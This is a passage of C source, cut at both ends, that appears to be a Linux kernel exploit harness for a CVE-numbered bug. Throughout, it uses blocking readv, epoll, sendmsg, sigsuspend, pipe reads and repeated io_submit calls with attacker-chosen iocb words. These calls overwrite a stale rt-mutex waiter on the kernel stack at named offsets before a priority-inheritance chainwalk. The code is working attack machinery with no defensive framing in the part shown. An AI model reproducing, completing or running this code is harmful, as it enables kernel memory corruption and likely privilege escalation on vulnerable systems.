    if (n != (ssize_t)total) {
        saved_errno = n < 0 ? errno : EIO;
        close(fds[0]);
        close(fds[1]);
        errno = saved_errno;
        return -1;
    }

    errno = 0;
    n = syscall(SYS_readv, fds[0], iov, vlen);
    saved_errno = errno;
    if (n != (ssize_t)total) {
        errno = n < 0 ? saved_errno : EIO;
        return -1;
    }

    if (waiter_churn_remember_fd_no_close(fds[0]) != 0 ||
        waiter_churn_remember_fd_no_close(fds[1]) != 0) {
        errno = EMFILE;
        return -1;
    }

    asm volatile("" : : "r"(sink), "r"(iov), "r"(n) : "memory");
    return 0;
}

static int waiter_post_return_readv_block_probe(int large_iov)
{
    enum {
        small_vlen = 4,
        large_vlen = 9,
        chunk_len = 64,
    };
    int sp[2] = {-1, -1};
    unsigned char sink[large_vlen * chunk_len];
    struct iovec iov[large_vlen];
    int vlen = large_iov ? large_vlen : small_vlen;
    long timeout_ms = waiter_hold_ms + ceil_div_long(pre_chainwalk_delay_us, 1000) + 1000;
    struct timeval tv;
    ssize_t n;
    int saved_errno;

    if (timeout_ms < 1000) {
        timeout_ms = 1000;
    }

    if (socketpair(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0, sp) != 0) {
        return -1;
    }

    tv.tv_sec = timeout_ms / 1000;
    tv.tv_usec = (timeout_ms % 1000) * 1000;
    if (setsockopt(sp[0], SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv)) != 0) {
        saved_errno = errno;
        close(sp[0]);
        close(sp[1]);
        errno = saved_errno;
        return -1;
    }

    memset(sink, 0, sizeof(sink));
    for (int i = 0; i < vlen; i++) {
        iov[i].iov_base = sink + ((size_t)i * chunk_len);
        iov[i].iov_len = chunk_len;
    }

    if (waiter_churn_remember_fd_no_close(sp[0]) != 0 ||
        waiter_churn_remember_fd_no_close(sp[1]) != 0) {
        errno = EMFILE;
        return -1;
    }

    /*
     * Publish readiness immediately before entering the blocking readv. The
     * caller normally publishes after return, but this mode is specifically for
     * scoring the in-kernel readv window before readv unwinds.
     */
    __atomic_store_n(&waiter_post_return_probe_failures, 0, __ATOMIC_RELEASE);
    __atomic_store_n(&waiter_churn_failures_seen, 0, __ATOMIC_RELEASE);
    __atomic_store_n(&waiter_churn_progress, 0, __ATOMIC_RELEASE);
    __atomic_store_n(&waiter_churn_done, 1, __ATOMIC_RELEASE);
    __atomic_store_n(&waiter_post_return_probe_done, 1, __ATOMIC_RELEASE);
    __atomic_store_n(&waiter_active_hold_started, 1, __ATOMIC_RELEASE);

    errno = 0;
    n = syscall(SYS_readv, sp[0], iov, vlen);
    saved_errno = errno;

    asm volatile("" : : "r"(sink), "r"(iov), "r"(n) : "memory");

    if (n < 0 &&
        (saved_errno == EAGAIN ||
         saved_errno == EWOULDBLOCK ||
         saved_errno == EINTR)) {
        return 0;
    }

    errno = n < 0 ? saved_errno : EIO;
    return -1;
}

static int waiter_post_return_pos_iov_socket_probe(int do_write)
{
    enum {
        iov_count = 4,
        chunk_len = 128,
    };
    int sp[2] = {-1, -1};
    unsigned char buf[iov_count * chunk_len];
    struct iovec iov[iov_count];
    struct timespec start_ts;
    struct timespec end_ts;
    long duration_us = -1;
    long ret;
    int saved_errno;

    if (socketpair(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0, sp) != 0) {
        return -1;
    }

    memset(buf, do_write ? 0x57 : 0, sizeof(buf));
    for (int i = 0; i < iov_count; i++) {
        iov[i].iov_base = buf + ((size_t)i * chunk_len);
        iov[i].iov_len = chunk_len;
    }

    if (waiter_churn_remember_fd_no_close(sp[0]) != 0 ||
        waiter_churn_remember_fd_no_close(sp[1]) != 0) {
        errno = EMFILE;
        return -1;
    }

    printf("[W] post-return %s prepared fd=%d peer=%d iov=%p buf=%p total=%zu\n",
           do_write ? "pwritev2-socket" : "preadv-socket",
           sp[0], sp[1], (void *)iov, (void *)buf, sizeof(buf));
    fflush(stdout);

    __atomic_store_n(&waiter_post_return_probe_failures, 0, __ATOMIC_RELEASE);
    __atomic_store_n(&waiter_churn_failures_seen, 0, __ATOMIC_RELEASE);
    __atomic_store_n(&waiter_churn_progress, 0, __ATOMIC_RELEASE);
    __atomic_store_n(&waiter_churn_done, 1, __ATOMIC_RELEASE);
    __atomic_store_n(&waiter_post_return_probe_done, 1, __ATOMIC_RELEASE);

    errno = 0;
    (void)clock_gettime(CLOCK_MONOTONIC, &start_ts);
    if (do_write) {
        ret = syscall(SYS_pwritev2, sp[0], iov, iov_count, 0, 0, 0);
    } else {
        ret = syscall(SYS_preadv, sp[0], iov, iov_count, 0, 0);
    }
    saved_errno = errno;
    if (clock_gettime(CLOCK_MONOTONIC, &end_ts) == 0) {
        duration_us = (end_ts.tv_sec - start_ts.tv_sec) * 1000000L +
                      (end_ts.tv_nsec - start_ts.tv_nsec) / 1000L;
    }

    printf("[W] post-return %s ret=%ld errno=%d duration_us=%ld\n",
           do_write ? "pwritev2-socket" : "preadv-socket",
           ret, ret < 0 ? saved_errno : 0, duration_us);
    fflush(stdout);

    asm volatile("" : : "r"(buf), "r"(iov), "r"(ret) : "memory");

    /*
     * This is a reachability/window smoke test. Fast ESPIPE/EINVAL means the
     * exact static iovec writer is not usable as a blocking post-return window.
     */
    errno = 0;
    return 0;
}

static int waiter_post_return_epoll_block_probe(void)
{
    int epfd = -1;
    int evfd = -1;
    struct epoll_event ev;
    struct epoll_event out;
    long timeout_ms = waiter_hold_ms + ceil_div_long(pre_chainwalk_delay_us, 1000) + 1000;
    int n;
    int saved_errno;

    if (timeout_ms < 1000) {
        timeout_ms = 1000;
    }
    if (timeout_ms > INT_MAX) {
        timeout_ms = INT_MAX;
    }

    epfd = epoll_create1(EPOLL_CLOEXEC);
    if (epfd < 0) {
        return -1;
    }

    evfd = eventfd(0, EFD_CLOEXEC | EFD_NONBLOCK);
    if (evfd < 0) {
        saved_errno = errno;
        close(epfd);
        errno = saved_errno;
        return -1;
    }

    memset(&ev, 0, sizeof(ev));
    memset(&out, 0, sizeof(out));
    ev.events = EPOLLIN;
    ev.data.u64 = 0x43499e9011ULL;
    if (epoll_ctl(epfd, EPOLL_CTL_ADD, evfd, &ev) != 0) {
        saved_errno = errno;
        close(epfd);
        close(evfd);
        errno = saved_errno;
        return -1;
    }

    if (waiter_churn_remember_fd_no_close(epfd) != 0 ||
        waiter_churn_remember_fd_no_close(evfd) != 0) {
        errno = EMFILE;
        return -1;
    }

    /*
     * Publish readiness immediately before entering epoll_wait. Static
     * analysis shows the blocking hrtimer frame overlaps stale offset 0x3d10.
     */
    __atomic_store_n(&waiter_post_return_probe_failures, 0, __ATOMIC_RELEASE);
    __atomic_store_n(&waiter_churn_failures_seen, 0, __ATOMIC_RELEASE);
    __atomic_store_n(&waiter_churn_progress, 0, __ATOMIC_RELEASE);
    __atomic_store_n(&waiter_churn_done, 1, __ATOMIC_RELEASE);
    __atomic_store_n(&waiter_post_return_probe_done, 1, __ATOMIC_RELEASE);
    __atomic_store_n(&waiter_active_hold_started, 1, __ATOMIC_RELEASE);

    errno = 0;
    n = epoll_wait(epfd, &out, 1, (int)timeout_ms);
    saved_errno = errno;

    asm volatile("" : : "r"(&out), "r"(n) : "memory");

    if (n == 0 || (n < 0 && saved_errno == EINTR)) {
        return 0;
    }

    errno = n < 0 ? saved_errno : EIO;
    return -1;
}

static int waiter_post_return_sendmsg_block_probe(int use_mmsg, int use_name)
{
    enum {
        iov_count = 8,
        chunk_len = 1024,
    };
    int sp[2] = {-1, -1};
    char fill[chunk_len];
    char buf[iov_count * chunk_len];
    struct iovec iov[iov_count];
    struct sockaddr_un name;
    struct msghdr msg;
    struct mmsghdr mmsg;
    long timeout_ms = waiter_hold_ms + ceil_div_long(pre_chainwalk_delay_us, 1000) + 1000;
    long filled = 0;
    int filled_to_eagain = 0;
    int sndbuf = 4096;
    struct timeval tv;
    long sent;
    int saved_errno;

    if (timeout_ms < 1000) {
        timeout_ms = 1000;
    }

    if (socketpair(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0, sp) != 0) {
        return -1;
    }

    tv.tv_sec = timeout_ms / 1000;
    tv.tv_usec = (timeout_ms % 1000) * 1000;
    if (setsockopt(sp[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf)) != 0 ||
        setsockopt(sp[0], SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv)) != 0) {
        saved_errno = errno;
        close(sp[0]);
        close(sp[1]);
        errno = saved_errno;
        return -1;
    }

    memset(fill, 0x73, sizeof(fill));
    memset(buf, 0x53, sizeof(buf));
    for (int i = 0; i < iov_count; i++) {
        iov[i].iov_base = buf + ((size_t)i * chunk_len);
        iov[i].iov_len = chunk_len;
    }
    memset(&msg, 0, sizeof(msg));
    memset(&name, 0, sizeof(name));
    name.sun_family = AF_UNIX;
    if (use_name) {
        msg.msg_name = &name;
        msg.msg_namelen = sizeof(sa_family_t);
    }
    msg.msg_iov = iov;
    msg.msg_iovlen = iov_count;
    memset(&mmsg, 0, sizeof(mmsg));
    mmsg.msg_hdr = msg;

    for (int i = 0; i < 1024; i++) {
        ssize_t n = send(sp[0], fill, sizeof(fill), MSG_DONTWAIT);
        if (n > 0) {
            filled += n;
            continue;
        }
        if (n < 0 && (errno == EAGAIN || errno == EWOULDBLOCK)) {
            filled_to_eagain = 1;
            break;
        }
        saved_errno = n < 0 ? errno : EIO;
        close(sp[0]);
        close(sp[1]);
        errno = saved_errno;
        return -1;
    }
    if (!filled_to_eagain) {
        close(sp[0]);
        close(sp[1]);
        errno = EIO;
        return -1;
    }

    if (waiter_churn_remember_fd_no_close(sp[0]) != 0 ||
        waiter_churn_remember_fd_no_close(sp[1]) != 0) {
        saved_errno = errno;
        close(sp[0]);
        close(sp[1]);
        errno = saved_errno;
        return -1;
    }

    printf("[W] post-return %s prepared filled=%ld iov=%p buf=%p name=%p namelen=%u msg=%p mmsg=%p timeout_ms=%ld\n",
           use_name ? "sendmmsg-name-block" :
           (use_mmsg ? "sendmmsg-block" : "sendmsg-block"),
           filled, (void *)iov, (void *)buf, (void *)&name,
           (unsigned int)msg.msg_namelen, (void *)&msg, (void *)&mmsg,
           timeout_ms);
    fflush(stdout);

    /*
     * Publish readiness immediately before entering the blocking sendmsg or
     * sendmmsg syscall. This is the same synchronization contract as
     * readv-block/epoll-block.
     */
    __atomic_store_n(&waiter_post_return_probe_failures, 0, __ATOMIC_RELEASE);
    __atomic_store_n(&waiter_churn_failures_seen, 0, __ATOMIC_RELEASE);
    __atomic_store_n(&waiter_churn_progress, 0, __ATOMIC_RELEASE);
    __atomic_store_n(&waiter_churn_done, 1, __ATOMIC_RELEASE);
    __atomic_store_n(&waiter_post_return_probe_done, 1, __ATOMIC_RELEASE);
    __atomic_store_n(&waiter_active_hold_started, 1, __ATOMIC_RELEASE);

    errno = 0;
    if (use_mmsg) {
        sent = syscall(SYS_sendmmsg, sp[0], &mmsg, 1U, 0);
    } else {
        sent = sendmsg(sp[0], &msg, 0);
    }
    saved_errno = errno;

    asm volatile("" : : "r"(buf), "r"(iov), "r"(&name), "r"(&msg),
                 "r"(&mmsg), "r"(sent) : "memory");

    if (sent < 0 &&
        (saved_errno == EAGAIN ||
         saved_errno == EWOULDBLOCK ||
         saved_errno == EINTR)) {
        return 0;
    }

    errno = sent < 0 ? saved_errno : EIO;
    return -1;
}

struct delayed_tgkill_args {
    long pid;
    long tid;
    long delay_us;
    int signo;
};

static int waiter_signal_seen;

static void waiter_signal_handler(int signo)
{
    (void)signo;
    __atomic_store_n(&waiter_signal_seen, 1, __ATOMIC_RELEASE);
}

static void *delayed_tgkill_thread(void *arg)
{
    struct delayed_tgkill_args *args = (struct delayed_tgkill_args *)arg;

    usleep((useconds_t)args->delay_us);
    syscall(SYS_tgkill, args->pid, args->tid, args->signo);
    return NULL;
}

static int waiter_post_return_sigsuspend_block_probe(void)
{
    struct sigaction sa;
    struct sigaction old_sa;
    sigset_t block_mask;
    sigset_t old_mask;
    sigset_t suspend_mask;
    struct delayed_tgkill_args signal_args;
    pthread_t signal_thread;
    int signal_thread_created = 0;
    long timeout_ms = waiter_hold_ms + ceil_div_long(pre_chainwalk_delay_us, 1000) + 1000;
    struct timespec start_ts;
    struct timespec end_ts;
    long duration_us = -1;
    int rc;
    int saved_errno;

    if (timeout_ms < 1000) {
        timeout_ms = 1000;
    }

    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = waiter_signal_handler;
    sigemptyset(&sa.sa_mask);
    if (sigaction(SIGUSR1, &sa, &old_sa) != 0) {
        return -1;
    }

    sigemptyset(&block_mask);
    sigaddset(&block_mask, SIGUSR1);
    rc = pthread_sigmask(SIG_BLOCK, &block_mask, &old_mask);
    if (rc != 0) {
        sigaction(SIGUSR1, &old_sa, NULL);
        errno = rc;
        return -1;
    }
    suspend_mask = old_mask;
    sigdelset(&suspend_mask, SIGUSR1);

    signal_args.pid = (long)getpid();
    signal_args.tid = gettid_long();
    signal_args.delay_us = timeout_ms * 1000;
    signal_args.signo = SIGUSR1;
    __atomic_store_n(&waiter_signal_seen, 0, __ATOMIC_RELEASE);

    rc = pthread_create(&signal_thread, NULL, delayed_tgkill_thread, &signal_args);
    if (rc == 0) {
        signal_thread_created = 1;
    } else {
        pthread_sigmask(SIG_SETMASK, &old_mask, NULL);
        sigaction(SIGUSR1, &old_sa, NULL);
        errno = rc;
        return -1;
    }

    printf("[W] post-return sigsuspend-block prepared pid=%ld tid=%ld signal=%d timeout_ms=%ld\n",
           signal_args.pid, signal_args.tid, signal_args.signo, timeout_ms);
    fflush(stdout);

    /*
     * Publish readiness immediately before entering sigsuspend. The all-syscall
     * scan reaches try_to_grab_pending at the stale slot through
     * __arm64_sys_rt_sigsuspend.
     */
    __atomic_store_n(&waiter_post_return_probe_failures, 0, __ATOMIC_RELEASE);
    __atomic_store_n(&waiter_churn_failures_seen, 0, __ATOMIC_RELEASE);
    __atomic_store_n(&waiter_churn_progress, 0, __ATOMIC_RELEASE);
    __atomic_store_n(&waiter_churn_done, 1, __ATOMIC_RELEASE);
    __atomic_store_n(&waiter_post_return_probe_done, 1, __ATOMIC_RELEASE);
    __atomic_store_n(&waiter_active_hold_started, 1, __ATOMIC_RELEASE);

    (void)clock_gettime(CLOCK_MONOTONIC, &start_ts);
    errno = 0;
    rc = sigsuspend(&suspend_mask);
    saved_errno = errno;
    if (clock_gettime(CLOCK_MONOTONIC, &end_ts) == 0) {
        duration_us = (end_ts.tv_sec - start_ts.tv_sec) * 1000000L +
                      (end_ts.tv_nsec - start_ts.tv_nsec) / 1000L;
    }

    if (signal_thread_created) {
        pthread_join(signal_thread, NULL);
    }
    pthread_sigmask(SIG_SETMASK, &old_mask, NULL);
    sigaction(SIGUSR1, &old_sa, NULL);

    asm volatile("" : : "r"(&suspend_mask), "r"(rc), "r"(duration_us) : "memory");

    printf("[W] post-return sigsuspend-block ret=%d errno=%d duration_us=%ld signal_seen=%d\n",
           rc, saved_errno, duration_us,
           __atomic_load_n(&waiter_signal_seen, __ATOMIC_ACQUIRE));
    fflush(stdout);

    if (rc < 0 && saved_errno == EINTR) {
        return 0;
    }

    errno = rc < 0 ? saved_errno : EIO;
    return -1;
}

struct local_iocb {
    uint64_t aio_data;
    uint32_t aio_key;
    uint32_t aio_rw_flags;
    uint16_t aio_lio_opcode;
    int16_t aio_reqprio;
    uint32_t aio_fildes;
    uint64_t aio_buf;
    uint64_t aio_nbytes;
    int64_t aio_offset;
    uint64_t aio_reserved2;
    uint32_t aio_flags;
    uint32_t aio_resfd;
};

struct local_sched_attr {
    uint32_t size;
    uint32_t sched_policy;
    uint64_t sched_flags;
    int32_t sched_nice;
    uint32_t sched_priority;
    uint64_t sched_runtime;
    uint64_t sched_deadline;
    uint64_t sched_period;
};

static int trigger_adjust_pi_syscall_for_tid(long tid, int nice, long attempt)
{
    struct local_sched_attr attr;
    struct timespec start_ts;
    struct timespec end_ts;
    long duration_us = -1;
    long ret;
    int saved_errno;

    memset(&attr, 0, sizeof(attr));
    attr.size = sizeof(attr);
    attr.sched_policy = SCHED_BATCH;
    attr.sched_nice = nice;

    errno = 0;
    (void)clock_gettime(CLOCK_MONOTONIC, &start_ts);
    ret = syscall(SYS_sched_setattr, tid, &attr, 0);
    saved_errno = errno;
    if (clock_gettime(CLOCK_MONOTONIC, &end_ts) == 0) {
        duration_us = (end_ts.tv_sec - start_ts.tv_sec) * 1000000L +
                      (end_ts.tv_nsec - start_ts.tv_nsec) / 1000L;
    }

    printf("[stage] sched_setattr(adjust-pi) attempt=%ld/%ld tid=%ld ret=%ld errno=%d duration_us=%ld policy=%u nice=%d\n",
           attempt, waiter_adjust_pi_repeats, tid, ret,
           ret < 0 ? saved_errno : 0, duration_us,
           attr.sched_policy, attr.sched_nice);
    fflush(stdout);

    if (ret < 0) {
        errno = saved_errno;
        return -1;
    }
    return 0;
}

static int waiter_post_return_io_submit_usercopy_probe(void)
{
    unsigned long ctx = 0;
    struct local_iocb cb;
    struct local_iocb *cbp = &cb;
    uint64_t *words = (uint64_t *)&cb;
    uint8_t scratch[64];
    struct timespec start_ts;
    struct timespec end_ts;
    long duration_us = -1;
    long ret;
    int saved_errno;

    for (size_t i = 0; i < sizeof(cb) / sizeof(words[0]); i++) {
        words[i] = 0x4349900000000000ULL | (uint64_t)i;
    }
    if (io_submit_word0_set) {
        words[0] = io_submit_word0;
    }
    if (io_submit_word1_set) {
        words[1] = io_submit_word1;
    }
    memset(scratch, 0x49, sizeof(scratch));

    /*
     * Keep the user-copy source valid, but make the request semantically
     * invalid. The target writer class is io_submit_one() copying this iocb
     * from EL0; queuing actual async I/O is unnecessary for the slot test.
     */
    cb.aio_lio_opcode = (uint16_t)io_submit_opcode;
    cb.aio_reqprio = (int16_t)io_submit_reqprio;
    cb.aio_fildes = (uint32_t)(int32_t)io_submit_fd;
    cb.aio_buf = (uint64_t)(uintptr_t)scratch;
    cb.aio_nbytes = sizeof(scratch);
    cb.aio_offset = 0;

    errno = 0;
    ret = syscall(SYS_io_setup, 1UL, &ctx);
    saved_errno = errno;
    if (ret != 0) {
        printf("[W] post-return io-submit-usercopy io_setup ret=%ld errno=%d\n",
               ret, saved_errno);
        fflush(stdout);
        errno = ret < 0 ? saved_errno : EIO;
        return -1;
    }

    uint32_t mapped_prio_word =
        (uint32_t)cb.aio_lio_opcode | ((uint32_t)(uint16_t)cb.aio_reqprio << 16);
    printf("[W] post-return io-submit-usercopy prepared ctx=0x%lx cb=%p cbp=%p words=%zu word0=0x%016llx word1=0x%016llx mapped_task=word0 mapped_lock=word1 opcode=0x%x reqprio=%d fd=%d mapped_prio=%d/0x%08x\n",
           ctx, (void *)&cb, (void *)&cbp, sizeof(cb) / sizeof(words[0]),
           (unsigned long long)words[0], (unsigned long long)words[1],
           (unsigned int)cb.aio_lio_opcode,
           (int)cb.aio_reqprio,
           (int)(int32_t)cb.aio_fildes,
           (int32_t)mapped_prio_word,
           mapped_prio_word);
    fflush(stdout);

    errno = 0;
    (void)clock_gettime(CLOCK_MONOTONIC, &start_ts);
    ret = syscall(SYS_io_submit, ctx, 1L, &cbp);
    saved_errno = errno;
    if (clock_gettime(CLOCK_MONOTONIC, &end_ts) == 0) {
        duration_us = (end_ts.tv_sec - start_ts.tv_sec) * 1000000L +
                      (end_ts.tv_nsec - start_ts.tv_nsec) / 1000L;
    }
    __atomic_store_n(&waiter_post_return_last_ret, ret, __ATOMIC_RELEASE);
    __atomic_store_n(&waiter_post_return_last_errno,
                     ret < 0 ? saved_errno : 0,
                     __ATOMIC_RELEASE);
    __atomic_store_n(&waiter_post_return_last_duration_us,
                     duration_us,
                     __ATOMIC_RELEASE);

    asm volatile("" : : "r"(&cb), "r"(&cbp), "r"(scratch),
                 "r"(ret), "r"(duration_us) : "memory");

    /*
     * Do not print after io_submit. For this fast-return writer, the next
     * syscall would itself become a stack writer before M can chainwalk.
     */
    if (ret == 1 || (ret < 0 && (saved_errno == EINVAL || saved_errno == EBADF))) {
        return 0;
    }

    errno = ret < 0 ? saved_errno : EIO;
    return -1;
}

static void waiter_io_submit_loop(void)
{
    unsigned long ctx = 0;
    struct local_iocb cb;
    struct local_iocb *cbp = &cb;
    uint64_t *words = (uint64_t *)&cb;
    uint8_t scratch[64];
    unsigned long long iterations = 0;
    unsigned long long failures = 0;
    long ret;
    int saved_errno;

    for (size_t i = 0; i < sizeof(cb) / sizeof(words[0]); i++) {
        words[i] = 0x4349900000000000ULL | (uint64_t)i;
    }
    if (io_submit_word0_set) {
        words[0] = io_submit_word0;
    }
    if (io_submit_word1_set) {
        words[1] = io_submit_word1;
    }
    memset(scratch, 0x49, sizeof(scratch));
    cb.aio_lio_opcode = (uint16_t)io_submit_opcode;
    cb.aio_reqprio = (int16_t)io_submit_reqprio;
    cb.aio_fildes = (uint32_t)(int32_t)io_submit_fd;
    cb.aio_buf = (uint64_t)(uintptr_t)scratch;
    cb.aio_nbytes = sizeof(scratch);
    cb.aio_offset = 0;

    errno = 0;
    ret = syscall(SYS_io_setup, 1UL, &ctx);
    saved_errno = errno;
    if (ret != 0) {
        printf("[W] isolated iosubmitloop io_setup ret=%ld errno=%d\n",
               ret, saved_errno);
        fflush(stdout);
        __atomic_store_n(&waiter_post_return_probe_failures, 1,
                         __ATOMIC_RELEASE);
        __atomic_store_n(&waiter_active_hold_started, 1, __ATOMIC_RELEASE);
        return;
    }

    printf("[W] isolated iosubmitloop prepared ctx=0x%lx cb=%p cbp=%p word0=0x%016llx word1=0x%016llx opcode=0x%x reqprio=%d fd=%d\n",
           ctx, (void *)&cb, (void *)&cbp,
           (unsigned long long)words[0], (unsigned long long)words[1],
           (unsigned int)cb.aio_lio_opcode, (int)cb.aio_reqprio,
           (int)(int32_t)cb.aio_fildes);
    fflush(stdout);

    /*
     * Each io_submit refreshes stale waiter task/lock/prio at 0x3d08..0x3d1b.
     * Keep the loop free of other syscalls so they cannot replace those slots.
     */
    __atomic_store_n(&waiter_active_hold_started, 1, __ATOMIC_RELEASE);
    while (!__atomic_load_n(&finish_waiter, __ATOMIC_ACQUIRE)) {
        errno = 0;
        ret = syscall(SYS_io_submit, ctx, 1L, &cbp);
        saved_errno = errno;
        iterations++;
        if (!(ret == 1 ||
              (ret < 0 && (saved_errno == EINVAL || saved_errno == EBADF)))) {
            failures++;
        }
        asm volatile("" : : "r"(&cb), "r"(&cbp), "r"(scratch), "r"(ret)
                     : "memory");
    }

    printf("[W] isolated iosubmitloop done iterations=%llu failures=%llu\n",
           iterations, failures);
    fflush(stdout);
}

static void waiter_io_submit_cow_loop(void)
{
    enum {
        mapping_count = 4096,
        warmup_count = 16,
    };
    unsigned long ctx = 0;
    struct local_iocb file_cb;
    struct local_iocb **maps = NULL;
    long page_size = sysconf(_SC_PAGESIZE);
    int fd = -1;
    unsigned long long iterations = 0;
    unsigned long long failures = 0;
    long ret;
    int saved_errno;

    if (page_size < (long)sizeof(file_cb)) {
        errno = EINVAL;
        goto fail;
    }
    maps = calloc(mapping_count, sizeof(*maps));
    if (!maps) {
        goto fail;
    }

#ifdef SYS_memfd_create
    fd = (int)syscall(SYS_memfd_create, "cve43499_iocb_cow", MFD_CLOEXEC);
#else
    errno = ENOSYS;
#endif
    if (fd < 0 || ftruncate(fd, page_size) != 0) {
        goto fail;
    }

    memset(&file_cb, 0, sizeof(file_cb));
    file_cb.aio_data = io_submit_word0_set ? io_submit_word0 : 0;
    if (io_submit_word1_set) {
        uint64_t *words = (uint64_t *)&file_cb;
        words[1] = io_submit_word1;
    }
    file_cb.aio_lio_opcode = (uint16_t)io_submit_opcode;
    file_cb.aio_reqprio = (int16_t)io_submit_reqprio;
    file_cb.aio_fildes = (uint32_t)fd;
    file_cb.aio_reserved2 = 0;
    if (pwrite(fd, &file_cb, sizeof(file_cb), 0) != (ssize_t)sizeof(file_cb)) {
        goto fail;
    }

    for (size_t i = 0; i < mapping_count; i++) {
        maps[i] = mmap(NULL, (size_t)page_size, PROT_READ | PROT_WRITE,
                       MAP_PRIVATE, fd, 0);
        if (maps[i] == MAP_FAILED) {
            maps[i] = NULL;
            goto fail;
        }
        /* Fault the file page for reads without breaking private COW. */
        asm volatile("" : : "r"(maps[i]->aio_data) : "memory");
    }

    errno = 0;
    ret = syscall(SYS_io_setup, 1UL, &ctx);
    saved_errno = errno;
    if (ret != 0) {
        errno = saved_errno;
        goto fail;
    }

    printf("[W] isolated iosubmitcowloop prepared ctx=0x%lx fd=%d maps=%d word0=0x%016llx word1=0x%016llx opcode=0x%x reqprio=%d\n",
           ctx, fd, mapping_count,
           (unsigned long long)file_cb.aio_data,
           (unsigned long long)((uint64_t *)&file_cb)[1],
           (unsigned int)file_cb.aio_lio_opcode, (int)file_cb.aio_reqprio);
    fflush(stdout);

    for (size_t i = 0; i < mapping_count; i++) {
        struct local_iocb *cbp = maps[i];

        if (i == warmup_count) {
            __atomic_store_n(&waiter_active_hold_started, 1,
                             __ATOMIC_RELEASE);
        }
        errno = 0;
        ret = syscall(SYS_io_submit, ctx, 1L, &cbp);
        saved_errno = errno;
        iterations++;
        if (!(ret == 1 ||
              (ret < 0 && (saved_errno == EINVAL || saved_errno == EBADF)))) {
            failures++;
        }
        asm volatile("" : : "r"(cbp), "r"(ret) : "memory");
    }

    while (!__atomic_load_n(&finish_waiter, __ATOMIC_ACQUIRE)) {
        cpu_relax_user();
    }
    printf("[W] isolated iosubmitcowloop done iterations=%llu failures=%llu\n",
           iterations, failures);
    fflush(stdout);
    return;

fail:
    saved_errno = errno;
    printf("[W] isolated iosubmitcowloop prepare failed errno=%d (%s)\n",
           saved_errno, strerror(saved_errno));
    fflush(stdout);
    __atomic_store_n(&waiter_post_return_probe_failures, 1,
                     __ATOMIC_RELEASE);
    __atomic_store_n(&waiter_active_hold_started, 1, __ATOMIC_RELEASE);
}

struct pipe_prime_waker_args {
    int fd;
    int read_armed;
    int done;
    long ret;
    int err;
};

static void *pipe_prime_waker_thread(void *opaque)
{
    struct pipe_prime_waker_args *args = opaque;
    const uint8_t byte = 0x49;
    long ret;
    int err;

    while (!__atomic_load_n(&args->read_armed, __ATOMIC_ACQUIRE)) {
        cpu_relax_user();
    }

    /* Give W enough time to reach pipe_read's empty-pipe wait path. */
    usleep(50000);
    errno = 0;
    ret = syscall(SYS_write, args->fd, &byte, sizeof(byte));
    err = errno;
    args->ret = ret;
    args->err = ret < 0 ? err : 0;
    __atomic_store_n(&args->done, 1, __ATOMIC_RELEASE);
    return NULL;
}

static int waiter_post_return_pipe_read_io_submit_probe(void)
{
    unsigned long ctx = 0;
    struct local_iocb cb;
    struct local_iocb *cbp = &cb;
    uint64_t *words = (uint64_t *)&cb;
    uint8_t scratch[64];
    uint8_t read_byte = 0;
    int pipe_fds[2] = {-1, -1};
    pthread_t waker;
    struct pipe_prime_waker_args waker_args;
    long read_ret;
    int read_err;
    long submit_ret;
    int submit_err;
    int rc;

    memset(&waker_args, 0, sizeof(waker_args));
    for (size_t i = 0; i < sizeof(cb) / sizeof(words[0]); i++) {
        words[i] = 0x4349900000000000ULL | (uint64_t)i;
    }
    if (io_submit_word0_set) {
        words[0] = io_submit_word0;
    }
    if (io_submit_word1_set) {
        words[1] = io_submit_word1;
    }
    memset(scratch, 0x49, sizeof(scratch));

    cb.aio_lio_opcode = (uint16_t)io_submit_opcode;
    cb.aio_reqprio = (int16_t)io_submit_reqprio;
    cb.aio_fildes = (uint32_t)(int32_t)io_submit_fd;
    cb.aio_buf = (uint64_t)(uintptr_t)scratch;
    cb.aio_nbytes = sizeof(scratch);
    cb.aio_offset = 0;

    if (pipe(pipe_fds) != 0) {
        return -1;
    }

    errno = 0;
    if (syscall(SYS_io_setup, 1UL, &ctx) != 0) {
        return -1;
    }

    waker_args.fd = pipe_fds[1];
    rc = pthread_create(&waker, NULL, pipe_prime_waker_thread, &waker_args);
    if (rc != 0) {
        errno = rc;
        return -1;
    }

    uint32_t mapped_prio_word =
        (uint32_t)cb.aio_lio_opcode | ((uint32_t)(uint16_t)cb.aio_reqprio << 16);
    printf("[W] post-return pipe-read-io-submit prepared ctx=0x%lx read_fd=%d write_fd=%d cb=%p cbp=%p word0=0x%016llx word1=0x%016llx mapped_task=word0 mapped_lock=word1 mapped_prio=%d/0x%08x expected_pipe_read_entry_sp=0x3d50 expected_wait_entry=0x3cc0 expected_tree_parent_self=0x3cd8\n",
           ctx, pipe_fds[0], pipe_fds[1], (void *)&cb, (void *)&cbp,
           (unsigned long long)words[0], (unsigned long long)words[1],
           (int32_t)mapped_prio_word, mapped_prio_word);
    fflush(stdout);

    __atomic_store_n(&waker_args.read_armed, 1, __ATOMIC_RELEASE);
    errno = 0;
    read_ret = syscall(SYS_read, pipe_fds[0], &read_byte, sizeof(read_byte));
    read_err = errno;

    while (!__atomic_load_n(&waker_args.done, __ATOMIC_ACQUIRE)) {
        cpu_relax_user();
    }
    __atomic_store_n(&waiter_pipe_prime_read_ret, read_ret, __ATOMIC_RELEASE);
    __atomic_store_n(&waiter_pipe_prime_read_errno,
                     read_ret < 0 ? read_err : 0, __ATOMIC_RELEASE);
    __atomic_store_n(&waiter_pipe_prime_write_ret, waker_args.ret,
                     __ATOMIC_RELEASE);
    __atomic_store_n(&waiter_pipe_prime_write_errno, waker_args.err,
                     __ATOMIC_RELEASE);
    if (read_ret != 1 || read_byte != 0x49 || waker_args.ret != 1) {
        errno = read_ret < 0 ? read_err : EIO;
        return -1;
    }

    /*
     * pipe_read's finish_wait leaves the stale tree node RB_EMPTY here. Do
     * not issue any syscall between that exact stack write and io_submit.
     */
    errno = 0;
    submit_ret = syscall(SYS_io_submit, ctx, 1L, &cbp);
    submit_err = errno;
    __atomic_store_n(&waiter_post_return_last_ret, submit_ret,
                     __ATOMIC_RELEASE);
